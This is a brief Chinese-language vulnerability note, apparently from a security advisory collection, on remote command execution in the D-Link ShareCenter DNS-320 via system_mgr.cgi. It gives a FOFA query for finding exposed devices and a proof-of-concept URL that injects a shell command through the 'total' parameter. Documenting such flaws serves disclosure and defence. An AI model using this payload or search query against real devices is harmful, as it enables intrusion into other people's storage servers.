# D-Link-ShareCenter-DNS-320-system_mgr.cgi-远程命令执行漏洞

## 漏洞描述

D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器

## 漏洞影响

> [!NOTE]
>
> D-Link ShareCenter DNS-320

## FOFA

> [!NOTE]
>
> app="D_Link-DNS-ShareCenter"

## 漏洞复现

登录页面如下

![image-20210605180903289](D-Link-ShareCenter-DNS-320-system_mgr.cgi-远程命令执行漏洞.assets/16273636164968052.jpg)

漏洞POC为

```
/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;
```

![image-20210605181224009](D-Link-ShareCenter-DNS-320-system_mgr.cgi-远程命令执行漏洞.assets/16273636167313669.jpg)